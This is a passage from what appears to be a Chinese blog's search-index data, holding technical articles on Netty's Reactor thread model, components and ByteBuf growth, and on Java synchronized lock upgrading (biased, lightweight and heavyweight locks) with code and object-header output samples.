&#125;&#125;\n\nNetty设计思想看完代码，我们发现Netty框架的目标就是让你的业务逻辑从网络基础应用编码中分离出来，让你可以专注业务的开发（处理器），而不需写一大堆类似NIO的网络处理操作。首先来看看Netty的设计思想。之前的NIO模型如下：\n\n其中的Reactor可以理解为一个多路复用器Selector加上一个处理线程。\n上图中是一个单线程的NIO模型，所有的客户端事件都由服务端的一个线程处理，在事件数量较大的时候单线程的处理能力不足，会造成事件处理的延迟较大。那么可以引入多线程进行事件处理：\n\n服务端通过线程池对事件进行异步处理，极大地提高了事件处理的能力。\n但是当事件数量巨大的时候，将事件分发到线程池中也是需要耗时的，这样同样会造成事件处理延迟。那么之后又出现了如下图所示的主从双Reactor架构：\n这样就可以拜托从Reactor完成资源的分发处理\n\n如上图所示，主Reactor只负责处理接收连接的事件，之后将与服务端进行连接的SocketChannel交给从Reactor，之后的读写事件都由从Reactor进行处理，并且从Reactor采用的是多线程模式。\n这样的设计模式，将连接事件和比较耗时的读写事件进行分离，可以保证连接事件的及时处理，如果读写事件的处理速度仍然较慢，还可以采用一主多从的模型，这也正是Netty的设计思想。\nNetty线程模型Netty的线程模型如下图所示：\n\nNetty抽象出两组线程池BossGroup和WorkerGroup，BossGroup专门负责接收客户端的连接，而WorkerGroup专门负责网络的读写，BossGroup和WorkerGroup类型都是NioEventLoopGroup。\nNioEventLoopGroup相当于一个事件循环线程组，这个组中含有多个事件循环线程，每一个事件循环线程是NioEventLoop。每个NioEventLoop都有一个多路复用器Selector，用于监听注册在其上的socketChannel的网络通讯。每个BossGroup中的NioEventLoop线程内部循环执行的步骤有3步：\n\n处理accept事件 , 与client建立连接 , 生成NioSocketChannel\n\n将NioSocketChannel注册到WorkerGroup中的某个NIOEventLoop上的Selector【一个NIOEventLoop有多个的NioSocketChannel\n\n处理任务队列中的非IO任务，即runAllTasks方法\n\n\n每个WorkerGroup中的NIOEventLoop线程循环执行的步骤如下：\n\n轮询注册到自己Selector上的所有NioSocketChannel的read和write事件\n处理 I&#x2F;O 事件即read和write 事件，在对应的NioSocketChannel上处理业务\nrunAllTasks方法处理任务队列TaskQueue中的任务 ，一些耗时的业务处理（非IO任务）一般可以放入TaskQueue中慢慢处理，这样不影响数据在pipeline中的流动处理\n\n每个WorkerGroup中的NIOEventLoop处理NioSocketChannel业务时会使用pipeline(管道)，管道中维护了很多 handler处理器用来处理NioSocketChannel中的数据。\nNetty中的组件\n【Bootstrap、ServerBootstrap】\n\nBootstrap 意思是引导，一个 Netty 应用通常由一个 Bootstrap 开始，主要作用是配置整个 Netty 程序，串联各个组件，Netty 中 Bootstrap 类是客户端程序的启动引导类，ServerBootstrap 是服务端启动引导类。\n\n【Future、ChannelFuture】\n\n正如前面介绍，在 Netty 中所有的 IO 操作都是异步的，不能立刻得知消息是否被正确处理。但是可以过同步等待它执行完成或者直接注册一个监听，具体的实现就是通过 Future 和 ChannelFutures，他们可以注册一个监听，当操作执行成功或失败时监听会自动触发注册的监听事件。\n\n【Channel】\n\nNetty 网络通信的组件，能够用于执行网络 I&#x2F;O 操作。Channel 为用户提供：\n\n当前网络连接的通道的状态（例如是否打开、是否已连接）\n网络连接的配置参数 （例如接收缓冲区大小）\n提供异步的网络 I&#x2F;O 操作（如建立连接，读写，绑定端口），异步调用意味着任何 I&#x2F;O 调用都将立即返回，并且不保证在调用结束时所请求的 I&#x2F;O 操作已完成\n调用立即返回一个 ChannelFuture 实例，通过注册监听器到 ChannelFuture 上，可以 I&#x2F;O 操作成功、失败或取消时回调通知调用方。\n支持关联 I&#x2F;O 操作与对应的处理程序。\n\n不同协议、不同的阻塞类型的连接都有不同的 Channel 类型与之对应。下面是一些常用的 Channel 类型，这些通道涵盖了 UDP 和 TCP 网络 IO 以及文件 IO：\n① NioSocketChannel，异步的客户端 TCP Socket 连接。\n② NioServerSocketChannel，异步的服务器端 TCP Socket 连接。\n③ NioDatagramChannel，异步的 UDP 连接。\n④ NioSctpChannel，异步的客户端 Sctp 连接。\n⑤ NioSctpServerChannel，异步的 Sctp 服务器端连接。\n\n【Selector】\n\nNetty 基于 Selector 对象实现 I&#x2F;O 多路复用，通过 Selector 一个线程可以监听多个连接的 Channel 事件。当向一个 Selector 中注册 Channel 后，Selector 内部的机制就可以自动不断地查询这些注册的 Channel 是否有已就绪的 I&#x2F;O 事件（例如可读、可写、网络连接完成等），这样就可以很简单地使用一个线程高效地管理多个Channel。\n\n【NioEventLoop】\n\nNioEventLoop 中维护了一个线程和任务队列，支持异步提交执行任务，线程启动时会调用 NioEventLoop 的run方法，执行IO任务和非IO任务。\nIO任务就是 Selector 上发生的事件，如 accept、connect、read、write 等，由processSelectedKeys方法触发。非 IO 任务会添加到 taskQueue 中的任务，如 register0、bind0 等任务，由runAllTasks方法触发。\n\n【NioEventLoopGroup】\n\nNioEventLoopGroup主要管理 NioEventLoop 的生命周期，可以理解为一个线程池，内部维护了一组线程，每个线程（NioEventLoop）负责处理多个 Channel 上的事件，而一个 Channel 只对应于一个线程。\n\n【ChannelHandler】\n\nChannelHandler 是一个接口，处理 I&#x2F;O 事件或拦截 I&#x2F;O 操作，并将其转发到其 ChannelPipeline（业务处理链）中的下一个处理程序。ChannelHandler 本身并没有提供很多方法，因为这个接口有许多的方法需要实现，方便使用期间，可以继承它的子类：\n① ChannelInboundHandler 用于处理入站 I&#x2F;O 事件（读事件）\n② ChannelOutboundHandler 用于处理出站 I&#x2F;O 操作（写事件）\n或者使用以下适配器类\n① ChannelInboundHandlerAdapter 用于处理入站 I&#x2F;O 事件（读事件）\n② ChannelOutboundHandlerAdapter 用于处理出站 I&#x2F;O 操作（写事件）\n\n【ChannelHandlerContext】\n\n保存 Channel 相关的所有上下文信息，同时关联一个 ChannelHandler 对象。\n\n【ChannelPipline】\n\n保存 ChannelHandler 的 List，用于处理或拦截 Channel 的入站事件和出站操作。ChannelPipeline 实现了一种高级形式的拦截过滤器模式，使用户可以完全控制事件的处理方式，以及 Channel 中各个的 ChannelHandler 如何相互交互。在 Netty 中每个 Channel 都有且仅有一个 ChannelPipeline 与之对应，它们的组成关系如下：\n\n一个 Channel 包含了一个 ChannelPipeline，而 ChannelPipeline 中又维护了一个由 ChannelHandlerContext 组成的双向链表，并且每个 ChannelHandlerContext 中又关联着一个 ChannelHandler。read事件（入站事件）和write事件（出站事件）在一个双向链表中，入站事件会从链表 head 往后传递到最后一个入站的 handler，出站事件会从链表 tail 往前传递到最前一个出站的 handler，两种类型的 handler 互不干扰。\nByteBuf介绍Nio中的缓冲区为ByteBuffer，它的操作比较复杂，因此Netty引入了自己缓冲区ByteBuf。\n基本结构从结构上来说，ByteBuf由一串字节数组构成，数组中每个字节用来存放信息。ByteBuf提供了两个索引，一个用于读取数据，一个用于写入数据。这两个索引通过在字节数组中移动，来定位需要读或者写信息的位置。\n当从 ByteBuf 读取时，它的readerIndex（读索引）将会根据读取的字节数递增。同样当写ByteBuf时，它的 writerIndex（写索引）也会根据写入的字节数进行递增：\n[\n需要注意的是极限的情况是readerIndex刚好读到了writerIndex写入的地方。如果readerIndex超过了 writerIndex的时候，Netty会抛出IndexOutOfBoundsException异常。\n常用APIByteBuf中的常用API如下：\npublic class NettyByteBuf &#123;    public static void main(String[] args) &#123;        // 通过Unpooled工具类创建byteBuf对象，该对象内部包含一个字节数组byte[10]                // 通过readerindex和writerIndex和capacity，将buffer分成三个区域        // 已经读取的区域：[0,readerindex)        // 可读取的区域：[readerindex,writerIndex)        // 可写的区域: [writerIndex,capacity)        ByteBuf byteBuf = Unpooled.buffer(10);        // 或者根据已有字符串创建ByteBuf        ByteBuf byteBuf2 = Unpooled.copiedBuffer(&quot;hello,jimmy!&quot;, CharsetUtil.UTF_8);         for (int i = 0; i &lt; 8; i++) &#123;            // 指定位置写数据            byteBuf.writeByte(i);        &#125;        System.out.println(&quot;byteBuf=&quot; + byteBuf);        for (int i = 0; i &lt; 5; i++) &#123;            // 指定位置读数据            System.out.println(byteBuf.getByte(i));        &#125;        System.out.println(&quot;byteBuf=&quot; + byteBuf);        for (int i = 0; i &lt; 5; i++) &#123;            // 读数据，readerIndex++            System.out.println(byteBuf.readByte());        &#125;        System.out.println(&quot;byteBuf=&quot; + byteBuf);        if (byteBuf2.hasArray()) &#123;            // 获取ByteBuf中的字节数组            byte[] content = byteBuf2.array();            // 将字节数组转成字符串            System.out.println(new String(content, CharsetUtil.UTF_8));            System.out.println(&quot;byteBuf2=&quot; + byteBuf2);            // 获取字节数组0这个位置的字符的ascii码            System.out.println(byteBuf2.getByte(0));             // 可读的字节数，写指针减读指针的值            int len = byteBuf2.readableBytes();             System.out.println(&quot;len=&quot; + len);            // 取出各个字节            for (int i = 0; i &lt; len; i++) &#123;                System.out.println((char) byteBuf2.getByte(i));            &#125;            // 范围读取            System.out.println(byteBuf2.getCharSequence(0, 6, CharsetUtil.UTF_8));            System.out.println(byteBuf2.getCharSequence(6, 6, CharsetUtil.UTF_8));        &#125;    &#125;&#125;\n\n扩容机制ByteBuf有自己的扩容机制。从writeBytes写数据开始：\npublic ByteBuf writeBytes(byte[] src) &#123;    writeBytes(src, 0, src.length);    return this;&#125;public ByteBuf writeBytes(byte[] src, int srcIndex, int length) &#123;    // 调用ensureWritable方法确保空间足够写入    ensureWritable(length);    setBytes(writerIndex, src, srcIndex, length);    writerIndex += length;    return this;&#125;public ByteBuf ensureWritable(int minWritableBytes) &#123;    // 调用ensureWritable0    ensureWritable0(checkPositiveOrZero(minWritableBytes, &quot;minWritableBytes&quot;));    return this;&#125;final void ensureWritable0(int minWritableBytes) &#123;    // 当前已写位置    final int writerIndex = writerIndex();    // 当前数据写入后的长度    final int targetCapacity = writerIndex + minWritableBytes;    // 如果没有超过容量，直接返回    if (targetCapacity &lt;= capacity()) &#123;        ensureAccessible();        return;    &#125;    // 如果超过了容量，并且设置了checkBounds（io.netty.buffer.checkBounds）为true，直接抛出异常    if (checkBounds &amp;&amp; targetCapacity &gt; maxCapacity) &#123;        ensureAccessible();        throw new IndexOutOfBoundsException(String.format(                &quot;writerIndex(%d) + minWritableBytes(%d) exceeds maxCapacity(%d): %s&quot;,                writerIndex, minWritableBytes, maxCapacity, this));    &#125;    // 得到可写长度    final int fastWritable = maxFastWritableBytes();    // 如果可写长度大于需要写入的长度    int newCapacity = fastWritable &gt;= minWritableBytes ?   \t\t      // 如果还够写，长度不变              writerIndex + fastWritable               // 否则调用AbstractByteBufAllocator的calculateNewCapacity进行扩容            : alloc().calculateNewCapacity(targetCapacity, maxCapacity);    // Adjust to the new capacity.    capacity(newCapacity);&#125;\n\nAbstractByteBufAllocator的calculateNewCapacity方法进行扩容：\npublic int calculateNewCapacity(int minNewCapacity, int maxCapacity) &#123;    checkPositiveOrZero(minNewCapacity, &quot;minNewCapacity&quot;);    // 比最大值还大就抛出异常    if (minNewCapacity &gt; maxCapacity) &#123;        throw new IllegalArgumentException(String.format(                &quot;minNewCapacity: %d (expected: not greater than maxCapacity(%d)&quot;,                minNewCapacity, maxCapacity));    &#125;    // 设置阈值为4MB    final int threshold = CALCULATE_THRESHOLD; // 4 MiB page    // 如果要扩容的长度恰好等于阈值就直接返回阈值    if (minNewCapacity == threshold) &#123;        return threshold;    &#125;    // 如果超过了阈值，每次扩容4MB    if (minNewCapacity &gt; threshold) &#123;        int newCapacity = minNewCapacity / threshold * threshold;        if (newCapacity &gt; maxCapacity - threshold) &#123;            newCapacity = maxCapacity;        &#125; else &#123;            newCapacity += threshold;        &#125;        return newCapacity;    &#125;    // 如果没超过阈值，从64Byte开始成倍增长    int newCapacity = 64;    while (newCapacity &lt; minNewCapacity) &#123;        newCapacity &lt;&lt;= 1;    &#125;    return Math.min(newCapacity, maxCapacity);&#125;\n\nNetty的ByteBuf扩容过程如下：\n\n默认阈值为4MB（这个阈值是一个经验值，不同场景可能取值不同），当需要的容量等于阈值，使用阈值作为新的缓存区容量目标容量。\n如果大于阈值，采用每次步进4MB的方式进行内存扩张，扩张后需要和最大内存（maxCapacity）进行比较，大于maxCapacity的话就用maxCapacity。\n如果小于阈值，采用倍增的方式，以64Byte作为基本数值，每次翻倍增长，直到倍增后的结果大于或等于需要的容量值。+\n\n","tags":["2021"]},{"title":"synchronized详解","url":"/2021/04/26/2021/synchronized%E8%AF%A6%E8%A7%A3/","content":"\n\n同步器多线程编程中，可能出现多个线程同时访问同一个共享，可变资源的情况，这个资源我们称之为临界资源。\n\n共享：资源可以由多个线程同时访问\n\n\n可变：资源可以在其生命周期内被修改\n\n由此，我们可以引出一个问题：\n由于线程执行的过程是不可控的，所以需要采用同步机制来协同对象可变状态的访问。 \n常见的解决线程并发安全问题的方式是序列化访问临界资源\n即在同一时刻只允许一个线程访问临界资源，也称作为同步互斥访问。\nJava中提供了两种方式来实现同步互斥访问：synchronized 和 Lock\n同步器的本质就是加锁，为了序列化访问临界资源\nsynchronized原理详解synchronized内置锁是一种对象锁(锁的是对象而非引用)，作用粒度是对象，可以用来实现对临界资源的同步互斥访问，是可重入的。\n加锁的方式：\n1、同步实例方法，锁是当前实例对象\n2、同步类方法，锁是当前类对象\n3、同步代码块，锁是括号里面的对象\nMonitor监视器锁任何一个对象都有一个Monitor与之关联，当且一个Monitor被持有后，它将处于锁定状态。\nSynchronized在JVM里的实现都是 基于进入和退出Monitor对象来实现方法同步和代码块同步，虽然具体实现细节不一样，但是都可以通过成对的MonitorEnter和MonitorExit指令来实现。\nsynchronized关键词的JVM指令使用synchronized修饰代码块时，字节码后会被翻译成monitorenter和monitorexit两条指令分别在同步块逻辑代码的起始位置与结束位置：\n// class version 51.0 (51)// access flags 0x21public class Basic/Thread1 &#123;  .........  // access flags 0x9  public static main([Ljava/lang/String;)V  ...........  //!!!!!!!!!!!!!!    MONITORENTER   L0    LINENUMBER 38 L0    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;    LDC &quot;\\u9501\\u8fdb\\u5165wait\\u7b49\\u5f85\\u4e4b\\u524d\\u7684\\u4ee3\\u7801&quot;    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V   L7    LINENUMBER 39 L7    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;    LDC &quot;\\u9501\\u8fdb\\u5165wait\\u7b49\\u5f85\\u4e4b\\u540e\\u7684\\u4ee3\\u7801&quot;    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V   L8    LINENUMBER 40 L8    ALOAD 2    //!!!!!!!!!!!!!!!!!!!!!!!!    MONITOREXIT   L1    GOTO L9   L2   FRAME FULL [[Ljava/lang/String; java/lang/String java/lang/Object] [java/lang/Throwable]    ASTORE 3    ALOAD 2    //!!!!!!!!!!!!!!!!!!!!!!!!    MONITOREXIT   L3   ..........................&#125;\n\n这两条指令对于不同的锁会有不同的操作。\n\nmonitorenter：\n每个对象都是一个监视器锁（monitor）。当monitor被占用时就会处于锁定状态，线程执行monitorenter指令时尝试获取monitor的所有权，过程如下：\n1、如果monitor的进入数为0，则该线程进入monitor，然后将进入数设置为1，该线程即为monitor的所有者；\n2、如果线程已经占有该monitor，只是重新进入，则进入monitor的进入数加1；\n3、如果其他线程已经占用了monitor，则该线程进入阻塞状态，直到monitor的进入数为0，再重新尝试获取monitor的所有权；\nmonitorexit：\n执行monitorexit的线程必须是object所对应的monitor的所有者。指令执行时，monitor的进入数减1，如果减1后进入数为0，那线程退出monitor，不再是这个monitor的所有者。其他被这个monitor阻塞的线程可以尝试去获取这个 monitor 的所有权。\nmonitorexit，指令出现了两次，第1次为同步正常退出释放锁；第2次为发生异常退出释放锁；\n通过上面两段描述，我们应该能很清楚的看出Synchronized的实现原理\nSynchronized的语义底层是通过一个monitor的对象来完成，其实wait&#x2F;notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait&#x2F;notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因。\n而使用synchronized修饰方法时，JVM指令如下：\n\n对象上的锁Synchronized一般有三种用法：\n\n锁类中的普通方法，锁的是当前实例对象(this)，多个实例对象对应多把锁\n锁类中的静态方法，锁的是当前类的Class对象，只有唯一一把锁\n锁类中普通方法的代码块，锁是synchronized()括号里面的对象，如果是静态对象只有唯一一把锁\n\n无论是哪种用法，锁的都是对象，那么到底怎么给一个Java对象加锁呢？\n首先我们都知道synchronized是依靠Monitor进行加解锁的，而Monitor对象是存在于每个Java对象的对象头Mark Word中（存储的指针的指向）。\nSynchronized锁便是通过这种方式获取锁的，也是为什么Java中任意对象可以作为锁的原因，同时notify/notifyAll/wait等方法会使用到Monitor锁对象，所以必须在同步代码块中使用。\n监视器Monitor有两种同步方式：互斥与协作。多线程环境下线程之间如果需要共享数据，需要解决互斥访问数据的问题，监视器可以确保监视器上的数据在同一时刻只会有一个线程在访问。\n那么有个问题来了，我们知道synchronized加锁加在对象上，对象是如何记录锁状态的呢？\n答案是锁状态是被记录在每个对象的对象头（Mark Word）中，下面我们一起认识一下对象的内存布局\n对象头结构之前我们也介绍过，HotSpot虚拟机中，对象在内存中存储的布局可以分为三块区域，对象头（Header）、实例数据（Instance Data）和对齐填充（Padding）：\nHotSpot虚拟机的对象头包括两部分信息\n其中第一部分是Mark Word，用于存储对象自身的运行时数据， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等等，它是实现轻量级锁和偏向锁的关键。\n这部分数据的长度在32位和64位的虚拟机中分别为32个和64个Bits\n我们单以32位举例：\n32位虚拟机的Mark Word\n\nMark word确定了该对象的状态，我们可以通过上图看到，锁标志位为重量级锁的时候，才指向Monitor指针。\n而在无锁  偏向锁  轻量级锁时，无锁状态时分代年龄等都记录在Markword\n偏向锁的时候，就是线程ID和分代年龄等等。\n那么锁升级的时候，那些信息大概是保存在其他地方了。\n锁升级在Mark Word字段表中，分别有无锁，偏向锁，轻量级锁和重量级锁，下面我们分别介绍。\n无锁无锁状态对应Mark Word表中：\n\n无锁非常简单，一个对象在刚刚创建的时候它就是无锁状态：\npublic class Juc_PrintMarkWord &#123;    public static void main(String[] args) throws InterruptedException &#123;        Object o = new Object();        //未出现任何获取锁的时候        System.out.println(ClassLayout.parseInstance(o).toPrintable());    &#125;&#125;\n\n对象头中的Mark Word内容如下：\n// 无锁OFFSET  SIZE   TYPE DESCRIPTION         VALUE    0     4     (object header)        01 00 00 00 (00000001 00000000 00000000 00000000) (1)    4     4     (object header)        00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n\n锁标志为对应的是001，表示没有锁。【小端模式\n偏向锁(单线程)偏向锁，顾名思义就是偏向第一个获取到锁对象的线程，并且在运行过程中，只有一个线程会访问同步代码块，不存在多线程的场景，这种情况下加的就是偏向锁。偏向锁状态对应Mark Word表中：\n\n可以看到当对象持有偏向锁时，对象头中记录了持有该偏向锁的线程ID。我们来演示一下：\npublic class Juc_PrintMarkWord &#123;    public static void main(String[] args) throws InterruptedException &#123;        Object o = new Object();        //未出现任何获取锁的时候        System.out.println(ClassLayout.parseInstance(o).toPrintable());        synchronized (o)&#123;            // 获取一次锁之后            System.out.println(ClassLayout.parseInstance(o).toPrintable());        &#125;    &#125;&#125;\n\n我们预期的结果应该是第一次打印001，第二次打印101，可是结果却如下：\n// 第一次打印：无锁 OFFSET  SIZE   TYPE DESCRIPTION           VALUE     0     4        (object header)       01 00 00 00 (00000001 00000000 00000000 00000000) (1)     4     4        (object header)       00 00 00 00 (00000000 00000000 00000000 00000000) (0) // 第二次打印：轻量级锁 OFFSET  SIZE   TYPE DESCRIPTION      VALUE     0     4      (object header)    18 f8 e5 02 (00011000 11111000 11100101 00000010) (48625688)     4     4      (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n\n不对啊，为什么直接变成轻量级锁了？难道不应该是偏向锁吗？\n这是由于java对于偏向锁的启动是在启动几秒之后才激活导致的，因为JVM启动的过程中会有大量的同步块，且这些同步块都有竞争，如果一启动就启动偏向锁，会出现很多没有必要的锁升级和撤销，因此JVM选择直接将其设置为轻量级锁。\n我们可以通过参数-XX:BiasedLockingStartupDelay=0参数，将偏向锁启动延迟设置为0，我们再启动一次看看：\n// 第一次打印：匿名偏向锁OFFSET  SIZE   TYPE DESCRIPTION       VALUE     0     4       (object header)    05 00 00 00 (00000101 00000000 00000000 00000000) (5)     4     4       (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第二次打印：偏向锁OFFSET  SIZE   TYPE DESCRIPTION      VALUE     0     4      (object header)    05 28 05 03 (00000101 00101000 00000101 00000011) (50669573)     4     4      (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n\n可以看到，JVM一开始就将对象状态设置为偏向锁，这是因为它检测到了我们后面可能会以该对象为锁产生线程竞争。不过我们可以发现一开始，其对象头中并没有保存线程ID，因为还没有线程获取锁，我们将其称为匿名偏向锁。\n之后又一个线程对获取了该锁，于是该对象头中就会记录该线程的ID。另外，通过参数-XX:-UseBiasedLocking可以关闭偏向锁，默认开启。\n经过研究发现，在大多数情况下，锁不仅不存在多线程竞争，而且总是由同一线程多次获得，因此为了减少同一线程获取锁(一些CAS操作)的代价而引入偏向锁。\n偏向锁的核心思想是：\n如果一个线程获得了锁，那么锁就进入偏向模式，此时Mark Word 的结构也变为偏向锁结构，当这个线程再次请求锁时， 无需再做任何同步操作，即获取锁的过程，这样就省去了大量有关锁申请的操作，从而也就提供程序的性能。所以，对于没有锁竞争的场合，偏向锁有很好的优化效果，毕竟极有可能连续多次是同一个线程申请相同的锁。\n但是对于不止一个线程访问锁的场合(无论有没有竞争)，偏向锁就失效了，因为这样场合极有可能每次申请锁的线程都是不相同的，因此这种场合下不应该使用偏向锁，而是升级为轻量级锁，如下图所示：\n\n当然，撤销偏向锁也是一个过程：需要在安全点暂停当前持有该偏向锁的线程，如果这时该线程还没有执行完同步代码块，则将锁升级为轻量级锁。\n轻量级锁(多个线程交替执行)倘若出现了多个线程，虚拟机并不会立即将锁升级为重量级锁，它还会尝试使用一种称为轻量级锁的优化手段，此时 Mark Word 的结构也变为轻量级锁的结构：\n\n我们来演示一下：\npublic class Juc_PrintMarkWord &#123;    public static void main(String[] args) &#123;        Object o = new Object();        // 未出现任何获取锁的时候        System.out.println(ClassLayout.parseInstance(o).toPrintable());\t    // 线程1获取锁        new Thread(()-&gt;&#123;            synchronized (o)&#123;                System.out.println(ClassLayout.parseInstance(o).toPrintable());            &#125;        &#125;).start();        System.out.println(ClassLayout.parseInstance(o).toPrintable());                // 线程2获取锁        new Thread(()-&gt;&#123;            synchronized (o)&#123;                System.out.println(ClassLayout.parseInstance(o).toPrintable());            &#125;        &#125;).start();    &#125;&#125;\n\n输出结果如下：\n// 第一次输出：匿名偏向锁OFFSET  SIZE   TYPE DESCRIPTION         VALUE     0     4      (object header)      05 00 00 00 (00000101 00000000 00000000 00000000) (5)     4     4      (object header)      00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第二次输出：偏向锁(线程1持有)OFFSET  SIZE    TYPE DESCRIPTION       VALUE     0     4      (object header)    05 d8 b2 1f (00000101 11011000 10110010 00011111) (531814405)     4     4      (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第三次输出：偏向锁(线程1持有)OFFSET  SIZE   TYPE DESCRIPTION         VALUE     0     4      (object header)    05 d8 b2 1f (00000101 11011000 10110010 00011111) (531814405)     4     4      (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第四次输出：轻量级锁(线程2持有)OFFSET  SIZE   TYPE DESCRIPTION         VALUE     0     4      (object header)    90 f0 94 1f (10010000 11110000 10010100 00011111) (529854608)     4     4      (object header)    00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n\n可以看到，当线程2申请锁后，由于当前偏向锁中的线程ID不是自己的ID，因此升级为了轻量级锁。轻量级锁对应的Mark Word中除了锁标志位，还有一个**指向线程栈中锁记录的指针(pointer to Lock Record)**，那么这个锁记录(Lock Record)是什么？\n当升级为轻量级锁后，Mark Word的结构会发生改变，原来Mark Word的内容会被拷贝至当前持有该锁的线程栈帧中的**锁记录(Lock Record)**区域，而Mark Word会变为指向这块区域的一个指针。如图所示：\n\nLock Record是线程帧栈中的一个内存区域，其中有两个重要的字段：\n\n_displaced_header：存放原来锁对象Mark Word的拷贝，用于CAS操作\nowner：指向锁对象，便于找到哪个对象被锁住了\n\n简单来说，Mark Word中的指针用于找到哪个线程正持有该锁。如果有另一个线程要获取该轻量级锁，流程如下：\n\n可以看到，轻量级锁竞争的过程，其实主要就是锁对象Mark Word中锁记录指针修改的过程，如果修改失败，那么说明该锁对象正在被其他线程持有。自旋一会，依旧不能获得锁就会升级为重量级锁。这样看，轻量级锁的情况下一旦有竞争，就会升级为重量级锁，那轻量级锁的存在有什么意义呢？\n轻量级锁能够提升程序性能的依据是对绝大部分的锁，在整个同步周期内都不存在竞争，注意这是经验数据。需要了解的是，轻量级锁所适应的场景是线程交替执行同步块的场合，如果存在同一时间访问同一锁的场合，即产生了锁的竞争，就会导致轻量级锁膨胀为重量级锁。 膨胀过程大致如下：\n\n\n线程2申请轻量级锁，发现锁记录指针指向线程1的栈帧，锁被线程1持有，发生了锁竞争，锁进行膨胀\n线程2初始化Monitor对象，将锁记录指针修改为指向Monitor对象的指针\n此时，线程1还在执行，因此Monitor的拥有者为线程1，而线程2进入等待队列\n线程1执行完毕后，发现锁以及升级为重量级锁了，通过锁记录中的owner找到Monitor对象，进行重量级锁的释放流程\n\n重量级锁(多线程存在竞争)在轻量级锁的情况下，如果存在了多线程竞争锁，那锁就会升级为重量级锁，对象的Mark Word也会发生变化：\n\n我们来演示一下重量级锁：\npublic class Juc_PrintMarkWord &#123;    public static void main(String[] args) &#123;        Object o = new Object();        // 未出现任何获取锁的时候        System.out.println(ClassLayout.parseInstance(o).toPrintable());\t    // 线程1获取锁        Thread thread1 = new Thread()&#123;            @Override            public void run() &#123;                synchronized (a)&#123;                    System.out.println(ClassLayout.parseInstance(a).toPrintable());                    try &#123;                        //让线程晚点死亡，造成锁的竞争                        Thread.sleep(2000);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;        &#125;;        // 线程2获取锁        Thread thread2 = new Thread()&#123;            @Override            public void run() &#123;                synchronized (a)&#123;                    System.out.println(ClassLayout.parseInstance(a).toPrintable());                    try &#123;                        Thread.sleep(2000);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;        &#125;;        // 线程1、2同时启动，产生锁竞争        thread1.start();        thread2.start();    &#125;&#125;\n\n 结果如下：\n// 第一次输出:匿名偏向锁OFFSET  SIZE   TYPE DESCRIPTION          VALUE     0     4      (object header)       05 00 00 00 (00000101 00000000 00000000 00000000) (5)     4     4      (object header)       00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第二次输出:偏向锁OFFSET  SIZE   TYPE DESCRIPTION        VALUE     0     4      (object header)     05 98 e7 1f (00000101 10011000 11100111 00011111) (535271429)     4     4      (object header)     00 00 00 00 (00000000 00000000 00000000 00000000) (0)// 第三次输出：重量级锁OFFSET  SIZE   TYPE DESCRIPTION        VALUE     0     4      (object header)     a f5 e3 1c (01011010 11110101 11100011 00011100) (484701530)     4     4      (object header)     00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n\n可以看到，线程1、2同时启动后，会产生锁竞争，于是我们看到出现了重量级锁。之前我们能也介绍了，Mark Word中的指向锁记录的指针，会变成指向Monitor对象的指针。那这个Monitor对象是什么？它有什么用？\n我们先来看看C++源码中对Monitor的定义：\n// Monitor的结构体ObjectMonitor::ObjectMonitor() &#123;    _header       = NULL;    // 对象头  _count        = 0;         _waiters      = 0,    _recursions   = 0;       // 线程的重入次数  _object       = NULL;      _owner        = NULL;    // 标识拥有该monitor的线程，即持有锁的线程  _WaitSet      = NULL;    // 等待线程的集合，调用object.wait()方法处于wait状态的线程处于其中                           // 调用object.notify()方法后会进入_cxq或_EntryList中  _WaitSetLock  = 0 ;    _Responsible  = NULL ;    _succ         = NULL ;    _cxq          = NULL ;    // 多线程竞争锁时，竞争线程首先进入的单向链表  FreeNext      = NULL ;    _EntryList    = NULL ;    // 所有在等待获取锁的线程的集合  _SpinFreq     = 0 ;    _SpinClock    = 0 ;    OwnerIsThread = 0 ;  &#125;\n\n可以把Monitor理解为一个同步工具，也可以描述为一种同步机制，它通常被描述为一个对象。\n与一切皆对象一样，在Java虚拟机（HotSpot）中，Monitor是由ObjectMonitor实现的，它就是实现重量级锁的关键。\n所有的状态为重量级锁的对象，其对象头中的指针都指向一个Monitor，那么所有线程针对这把锁的竞争、释放都是基于这个Monitor实现的。\n我们来看看在重量级锁的级别下线程对锁的竞争：\n\n我们看到了一个叫做自旋的操作，什么是自旋？\n锁申请失败后，虚拟机为了避免线程真实地在操作系统层面挂起，还会进行一项称为自旋锁的优化手段。\n这是基于在大多数情况下，线程持有锁的时间都不会太长，如果直接挂起操作系统层面的线程可能会得不偿失，毕竟在我们之前介绍过的内核线程模型下，操作系统实现线程之间的切换时需要从用户态转换到内核态，这个状态之间的转换需要相对比较长的时间，时间成本相对较高。\n因此自旋锁会假设在不久将来，当前的线程可以获得锁，因此虚拟机会让当前想要获取锁的线程循环重新申请锁。\n在经过若干次循环后，如果得到锁，就顺利进入临界区。如果还不能获得锁，那就会将线程在操作系统层面挂起。我们可以通过下面的伪代码理解：\n// 设定自旋次数为10count = 10;// 自旋while(count &gt; 0)&#123;    // 申请成功    if(加锁成功) break;    // 申请失败    count--;    // 自旋10次后仍然申请失败    if(count == 0) 阻塞线程;&#125;// 